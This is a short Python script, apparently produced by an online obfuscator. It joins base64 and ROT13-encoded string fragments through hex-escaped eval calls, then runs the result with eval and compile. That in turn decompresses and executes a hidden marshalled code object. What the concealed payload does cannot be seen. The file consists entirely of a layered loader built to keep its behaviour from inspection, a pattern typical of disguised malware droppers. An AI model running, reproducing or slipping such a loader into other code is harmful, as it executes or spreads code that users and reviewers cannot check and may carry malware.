# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IG1hcnNoYWwsemxpYixiYXNlNjQKZXhlYyhtYXJzaGFsLmxvYWRzKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKCJlSngxVmVseUUwY1E3cFZ2WVdOakc0d3h4NWpEY2FvaUgwb1Z3UkFIaEMwc1g0SkNjcEhhL0VpTk5HTnBwTDJZbVFVTGlsL09VK1FwOGc3NWwyZklxNlNTbmxtdEpPUEtTcnZieDlmZDB6M2RzM1hvWHNONHY4QmIvWkVCWVBoM3dBTndlN1FEcnBQU0dYQXpLVDBFN2xCS0Q0TTduTklqNEk2azlDaTRveWs5QnU1WVNvK0RPNTdTRStCT3BIUVczS3lsTStCZEFYOFMzRWx3dXJvcGNLZWdWT0pYZ1EzQk9hNXFHdmcwc0dGb1owRCtEV3dFOWtvY29PVkFhd2JPQVp3TFRMQnMwSzFyaGxIL0FCdjlHaDNBaFdUNE1MUm1nZUdLeCtFYzA1NERnNTRITm1GaU95eHI3RFBRdWc3c1NpS1o3RXVtRXNuVmJneTBtcmFTaStxWnZ2cGFvazZZV2VBM2dNOFowUUtiZzRVQjFmeWc2bnFpWWpmQVhRR'
love = 'Uc2DJkmq1qGAGEQARA1rzgOMSp4Dyp0ISqSqxWTARkxp1OlMHVmHHjmEUWOoTACBRAhARkKHSqOo3MUGmSPETyPZJ5XH1WkIUH5AzqVq084DKLlqSSfowuWFRqBnKABqUqDo1AZqJE1qaqlZTgHJRcXp254FzA2X1Z1GHIfrJABX3IFATkSM2AkpKy2JKIyFzM2GKSlEUOWAzx0BKSIZ0kYZ29GnUO4LISLMaOfLGyCqxAPpSWIpIxeFyIwrTIIAzISoGWuJUxkLKqCLKclLaq2oRAOMRqdHxydHJEwEKSjnGyunKMRJKyjEwIAZxEInHE0n2kSZwI3M3IeZR5Ip0AlHUt4FFgCqwAnZ29SLzIiMKNkF3D5AwOlMSAenIEIHJqGFyOYI0WUMxW3Z3uGHIEUJTAGETc2DJcUpHZ3JxAvoyt2nUL4Gyqgn2qwIKALAUDkoxuHJHWhIzkVrUAIpGSiExcTZxgUpmOSD2SeMKEgGwyhZ2IDrRWgIySUnz1Wo1terTIQJIuaLHIGJyALoyOjBScjo291MT03GIMkZ2kGHyA6BPg5rJ11AUycozEQnUOaAaA0IxIErIMTq1W4Jz1jEKuAMJWwMxq5JTExqQ'
god = 'Fvd0xJMEpoM0dwN1BwSFgrcGJZOTF1WUFXVXBwNUhQb21Jckt6WVYrNDlPUTExNk1Wcmh0dmQyVCsyeWRjWldWZXNUaVZiN3lHbC81N2tOZ25KNVNLcTFNZFFNcUt1SWZackIwVGRRT21nU2Q5Q3phRnFBUC9PRkxNUVJiWlhKRDJscWtPYnRCRUhqUmNObndwdnJSNzZhaHAxdGdPU2lwTnRRcXlzdHd6amFUdVJWZUphaTlmMVUvTDVTemI3K1l1NmliSldqR25YUXEzaW10ck05eDNyR1ZUeVdqdUlaZTE5cDhFK1JKNnFxNnRtUDMwZHJmVnc0aEFQWi9VUTVlL1N2VDlBbHdWU292VTJOdXMyMlhpeTlmaEpmbU5qYTJzakw0YU1neC82RFZFcEhwOFV5S3ZYMWRla1VONHRrR3J4cUZBaXUvdms4S1M4czA5ZUh4Vkw1T0NrVWtWL2haM0Q0bHVWTTNuOGoxRmwvL2hOb1d5c1RSWDlwSXBxT1kzMjJLL3NIeFVPRWJGVFBFek1lejdzWnZVOTd1N2IrTFk1ZWl2ZExaVDN5SEd4dkZmY0tSV3FGNWExWmk2Rnh6U2NzVVl1eExraFRhMGo'
destiny = '5JSV5oyInnHkFZRkIA0VkrSSDZyOUpHqOMQxeoxVeo3cMpz1nZ3OvZSR1BJkBBSSCDzAPqaHlEKEMZxIPZwWwIxAKHIuRJSElA0u1EHAjqRf5pSVloaq0qTMQAHueL0AbAHMvJaEGZyEmDaqEBTIELxMZIwySIR4ln3S1FwE5GyOnGKqhqyuEIJ1TM2gEZaIHHKEnDwqVZTcXEIcEEP8lqR1PnURmG2jjE1y0q3WDp3WHn1ylFxMjESyCL3ATEF8inKSQF05vI0j3JJ90q1RiEGyjnJuuFzIbFSInAwL1HHWBpzSgLJtkZyygZREKZUx0AmD5qKOHFTInH2gkAytkMSIiJyZiFGWbFRMIG1ufAIIBrKOKoHpkX0uDIvgdM05jIFgHo0D0qHp0BR1KAx5ML1qgJR5HAUqZqTS5L2k4BJfjIT44M05DJKMUoHLko2gdo3MIZzkBZyEJAxxlAIAWL1MzGyEYrJSMqySzrJkGLH5GrzgFrwyep2AxY01jBRDlrKHiG1EDG1cAJauhGKueJaEWJzAuJH1dXmunAHqMryHkLIZmp2k6D1tenvgAp2ywqScGpmOaLzW1ARA1ozEhY2qApmOHEz0vXFxcXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))